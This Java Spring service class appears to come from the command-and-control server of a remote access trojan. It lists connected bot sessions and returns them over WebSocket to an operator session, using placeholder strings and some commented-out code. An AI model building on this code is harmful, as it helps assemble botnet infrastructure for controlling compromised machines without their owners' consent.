package devs.alex.sah.rat.c2server.services.impl;

import devs.alex.sah.rat.c2server.configuration.MessagesConfiguration;
import devs.alex.sah.rat.c2server.models.Message;
import devs.alex.sah.rat.c2server.services.MessagesBuilder;
import devs.alex.sah.rat.c2server.services.ServerEndpoint;
import devs.alex.sah.rat.c2server.services.WebSocketSessionService;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Service;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

@Slf4j
@Service
public class ServerEndpointImpl implements ServerEndpoint {

    private final WebSocketSessionService botWSSessionService;
    private final WebSocketSessionService userWSSessionService;
    private final MessagesBuilder messagesBuilder;
    private final MessagesConfiguration mConfig;

    public ServerEndpointImpl(@Qualifier("botWebSocketSessionService") WebSocketSessionService botWSSessionService,
                              @Qualifier("userWebSocketSessionService") WebSocketSessionService userWSSessionService, MessagesBuilder messagesBuilder, MessagesConfiguration mConfig) {
        this.botWSSessionService = botWSSessionService;
        this.userWSSessionService = userWSSessionService;
        this.messagesBuilder = messagesBuilder;
        this.mConfig = mConfig;
    }


    @Override
    public void executeCommand(Sender sender, WebSocketSession session, Message<?> message) {


            Map<String, WebSocketSession> botSessions = botWSSessionService.getSessions(new HashMap<>());
            StringBuilder sessionsIdList = new StringBuilder();
            for(Map.Entry<String, WebSocketSession> ws : botSessions.entrySet()) {
                sessionsIdList.append(ws.getKey()).append(" [test1 test2 test3 ][zzz zzz zz ]").append("\n");
            }
/*            if (message.getPayload() instanceof String) {
                ((Message<String>) message).setPayload(sessionsIdList.toString());
            }*/
            String envelope = messagesBuilder.generateServer2UserEnvelope(
                    session.getId(), message.getTargetModule(), message.getRequestID());

        try {
            session.sendMessage(new TextMessage(envelope + sessionsIdList.toString()));
        } catch (IOException e) {
            log.error("Fault send message. Message envelope: {}. Error: {}", envelope, e.getMessage());
        }
    }
}
